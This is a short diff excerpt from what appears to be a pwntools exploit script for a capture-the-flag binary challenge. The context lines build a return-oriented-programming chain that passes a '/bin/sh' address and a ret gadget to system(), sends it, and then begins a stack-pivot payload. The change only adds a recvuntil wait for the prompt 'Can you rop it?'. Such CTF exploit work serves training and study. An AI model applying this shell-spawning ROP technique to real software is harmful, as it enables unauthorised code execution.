@@ -291,8 +291,10 @@ payload += p64(binsh)
 payload += p64(0x00400416) #ret
 payload += p64(system_addr)
 
-
 p.send(payload)
+
+
+p.recvuntil(b"Can you rop it?\n")
 
 #6 stack pivot & main return
 payload = b'A'*0x100
